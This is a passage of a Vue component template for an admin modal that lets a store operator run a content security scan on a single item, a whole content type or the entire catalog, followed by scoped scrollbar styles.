                'p-3 rounded-xl border text-left transition-all flex flex-col items-center justify-center gap-1.5 cursor-pointer text-center',
                scanMode === 'specific'
                  ? 'border-primary bg-primary/5 text-primary ring-2 ring-primary/20 font-bold'
                  : 'border-input bg-card hover:bg-muted/50 text-muted-foreground'
              )"
            >
              <FileText class="w-4 h-4" />
              <span class="text-xs font-semibold">Specific Item</span>
            </button>

            <button
              type="button"
              @click="scanMode = 'content_type'"
              :class="cn(
                'p-3 rounded-xl border text-left transition-all flex flex-col items-center justify-center gap-1.5 cursor-pointer text-center',
                scanMode === 'content_type'
                  ? 'border-primary bg-primary/5 text-primary ring-2 ring-primary/20 font-bold'
                  : 'border-input bg-card hover:bg-muted/50 text-muted-foreground'
              )"
            >
              <Layers class="w-4 h-4" />
              <span class="text-xs font-semibold">Entire Type</span>
            </button>

            <button
              type="button"
              @click="scanMode = 'everything'"
              :class="cn(
                'p-3 rounded-xl border text-left transition-all flex flex-col items-center justify-center gap-1.5 cursor-pointer text-center',
                scanMode === 'everything'
                  ? 'border-primary bg-primary/5 text-primary ring-2 ring-primary/20 font-bold'
                  : 'border-input bg-card hover:bg-muted/50 text-muted-foreground'
              )"
            >
              <Globe2 class="w-4 h-4" />
              <span class="text-xs font-semibold">Everything</span>
            </button>
          </div>
        </div>

        <!-- Mode 1: Specific Item Inputs -->
        <template v-if="scanMode === 'specific'">
          <div class="space-y-1.5">
            <div class="flex items-center justify-between">
              <label class="text-xs font-bold text-muted-foreground uppercase">Target Item</label>
              <span v-if="isScanObjectsLoading" class="text-[11px] text-muted-foreground flex items-center gap-1">
                <Loader2 class="w-3 h-3 animate-spin" /> Searching...
              </span>
            </div>

            <div class="relative">
              <Search class="w-3.5 h-3.5 absolute left-2.5 top-2.5 text-muted-foreground pointer-events-none" />
              <input
                v-model="scanObjectSearchQuery"
                type="text"
                class="w-full h-9 pl-8 pr-3 rounded-md border border-input text-xs bg-background placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring/20"
                placeholder="Search products, categories, brands, or posts..."
              />
            </div>

            <div class="border border-input rounded-lg overflow-hidden bg-background relative flex flex-col">
              <div v-if="isScanObjectsLoading && availableScanObjects.length === 0" class="p-4 text-center text-xs text-muted-foreground flex items-center justify-center gap-2">
                <Loader2 class="w-4 h-4 animate-spin" /> Searching...
              </div>
              <div v-else-if="availableScanObjects.length === 0" class="p-4 text-center text-xs text-muted-foreground">
                No items found. Try a different search term.
              </div>
              <ul v-else class="max-h-48 overflow-y-auto">
                <li
                  v-for="obj in availableScanObjects"
                  :key="`${obj.type}-${obj.id}`"
                  @click="selectedScanObjectId = obj.id; selectedScanContentType = obj.type"
                  :class="cn(
                    'px-3 py-2 text-xs flex items-center justify-between cursor-pointer hover:bg-muted/50 transition-colors border-b border-border/50 last:border-b-0',
                    String(selectedScanObjectId) === String(obj.id) && selectedScanContentType === obj.type ? 'bg-primary/5 border-l-2 border-l-primary text-primary' : 'border-l-2 border-l-transparent'
                  )"
                >
                  <div class="flex flex-col gap-0.5 max-w-[70%]">
                    <span class="font-medium truncate">{{ obj.label }}</span>
                    <span class="text-[10px] text-muted-foreground truncate">{{ obj.sublabel }}</span>
                  </div>
                  <UiBadge variant="secondary" class="text-[10px] whitespace-nowrap">{{ obj.typeLabel }}</UiBadge>
                </li>
              </ul>
            </div>
            <p v-if="selectedScanObjectId" class="text-[11px] text-muted-foreground font-mono">
              Selected: <strong class="text-foreground">{{ selectedScanContentType }} #{{ selectedScanObjectId }}</strong>
            </p>
          </div>

          <div class="space-y-1">
            <label class="text-xs font-bold text-muted-foreground uppercase">Fields to Scan (Optional)</label>
            <input
              v-model="scanFieldsInput"
              type="text"
              class="w-full h-9 px-3 rounded-lg border border-input text-xs bg-background"
              placeholder="e.g., title, description"
            />
            <p class="text-[11px] text-muted-foreground">Leave empty to scan all default fields for this entity.</p>
          </div>
        </template>

        <!-- Mode 2: Entire Content Type Inputs -->
        <template v-else-if="scanMode === 'content_type'">
          <div class="space-y-1">
            <label class="text-xs font-bold text-muted-foreground uppercase">Content Type</label>
            <select
              v-model="selectedScanContentType"
              class="w-full h-9 px-3 rounded-lg border border-input bg-background text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option v-for="type in supportedContentTypes" :key="type.value" :value="type.value">
                {{ type.label }}
              </option>
            </select>
          </div>

          <div class="space-y-1">
            <label class="text-xs font-bold text-muted-foreground uppercase">Fields to Scan (Optional)</label>
            <input
              v-model="scanFieldsInput"
              type="text"
              class="w-full h-9 px-3 rounded-lg border border-input text-xs bg-background"
              placeholder="e.g., title, description"
            />
          </div>

          <div class="bg-amber-500/10 border border-amber-500/20 rounded-xl p-3 flex items-start gap-2 text-xs text-amber-700 dark:text-amber-400">
            <Info class="w-4 h-4 shrink-0 mt-0.5" />
            <span>Targeting all items of content type <strong>{{ selectedScanContentType }}</strong> across the store catalog.</span>
          </div>
        </template>

        <!-- Mode 3: Everything Inputs -->
        <template v-else-if="scanMode === 'everything'">
          <div class="bg-primary/5 border border-primary/15 rounded-xl p-4 space-y-2 text-xs">
            <div class="flex items-center gap-2 font-bold text-primary">
              <Globe2 class="w-4 h-4" />
              <span>Full System Content Security Inspection</span>
            </div>
            <p class="text-muted-foreground leading-relaxed">
              Targeting all supported content types (Products, Categories, Brands, and Blog Posts) across the entire application workspace.
            </p>
          </div>
        </template>

        <!-- Actions -->
        <div class="pt-4 flex gap-3">
          <UiButton 
            variant="outline" 
            class="flex-1" 
            @click="isRunScanModalOpen = false"
          >
            Cancel
          </UiButton>
          <UiButton 
            class="flex-1" 
            :disabled="isSubmittingScanRun" 
            @click="submitScanRun"
          >
            {{ isSubmittingScanRun ? 'Initiating Scan...' : 'Run Content Scan' }}
          </UiButton>
        </div>
      </div>
    </UiAdminModal>
  </div>
</template>

<style scoped>
.custom-scrollbar::-webkit-scrollbar {
  height: 4px;
}
.custom-scrollbar::-webkit-scrollbar-track {
  background: transparent;
}
.custom-scrollbar::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.2);
  border-radius: 10px;
}
.custom-scrollbar:hover::-webkit-scrollbar-thumb {
  background: rgba(148, 163, 184, 0.4);
}
</style>
